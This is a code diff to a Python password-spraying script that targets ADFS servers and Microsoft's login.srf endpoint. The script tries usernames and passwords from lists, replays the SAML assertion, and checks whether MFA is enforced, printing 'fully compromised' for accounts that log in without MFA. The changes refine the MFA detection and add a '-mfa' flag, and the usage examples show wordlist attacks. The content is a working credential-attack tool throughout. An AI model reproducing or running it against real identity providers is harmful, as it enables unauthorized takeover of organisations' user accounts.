@@ -30,9 +30,9 @@ def log_message(message, log_file=None, color=None):
             log.write(f"[{timestamp}] {message}" + "\n")
 
 
-def extract_saml_assertion(response_content):
+def extract_saml_assertion(adfs_login_response):
     wresult_pattern = r'<input type="hidden" name="wresult" value="([^"]+)" \/>'
-    wresult_match = re.search(wresult_pattern, response_content, re.DOTALL)
+    wresult_match = re.search(wresult_pattern, adfs_login_response.text, re.DOTALL)
 
     if wresult_match:
         wresult_value = wresult_match.group(1)
@@ -40,10 +40,6 @@ def extract_saml_assertion(response_content):
         return wresult_value
     else:
         return None
-
-
-def check_mfa_string(login_srf_response):
-    return "BeginAuth" in login_srf_response.text
 
 
 def check_authentication_cookies(login_srf_response):
@@ -78,7 +74,8 @@ def send_login_request(
             adfs_login_response.raise_for_status()
 
             if (
-                'action="https://login.microsoftonline.com:443/login.srf"'
+                adfs_login_response.status_code == 200
+                and 'action="https://login.microsoftonline.com:443/login.srf"'
                 in adfs_login_response.text
             ):
                 log_message(
@@ -88,7 +85,7 @@ def send_login_request(
                 )
 
                 if check_mfa:
-                    wresult_value = extract_saml_assertion(adfs_login_response.text)
+                    wresult_value = extract_saml_assertion(adfs_login_response)
                     if wresult_value:
                         login_srf_url = "https://login.microsoftonline.com/login.srf"
                         login_srf_payload = {
@@ -104,26 +101,29 @@ def send_login_request(
                         )
                         login_srf_response.raise_for_status()
 
-                        if check_authentication_cookies(login_srf_response):
-                            if check_mfa_string(login_srf_response):
+                        if (
+                            login_srf_response.status_code == 200
+                            and check_authentication_cookies(login_srf_response)
+                        ):
+                            if "BeginAuth" in login_srf_response.text:
                                 log_message(
                                     f"[-] MFA required for: {username}",
                                     log_file,
                                     color=Fore.RED,
                                 )
-                            else:
+                            elif "/kmsi" in login_srf_response.text:
                                 log_message(
                                     f"[+] MFA not required for: {username}",
                                     log_file,
                                     color=Fore.GREEN,
                                 )
                                 print(
-                                    f"=========== 🎉 {username} is fully compromised 🤌 ==========="
+                                    f"=====================  🎉 {Fore.GREEN}{username} is fully compromised 🤌{Style.RESET_ALL}"
                                 )
-                    else:
-                        print(
-                            f"{Fore.RED}[!] Unknown error checking MFA.{Style.RESET_ALL}"
-                        )
+                            else:
+                                print(
+                                    f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
+                                )
             elif verbose:
                 log_message(
                     f"[-] Login failed: {username} : {password}",
@@ -145,7 +145,7 @@ if __name__ == "__main__":
         formatter_class=argparse.RawTextHelpFormatter,
         epilog="Usage examples:"
         "\n  python script.py -t https://adfs.example.com -u user -p password123"
-        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123 --mfa"
+        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123 -mfa"
         "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt -v -l output.txt"
         "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -d 2"
         "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n",
@@ -197,6 +197,7 @@ if __name__ == "__main__":
         help="File to log the login results",
     )
     parser.add_argument(
+        "-mfa",
         "--mfa",
         action="store_true",
         help="Check if Multi-Factor Authentication (MFA) is required after successful login",
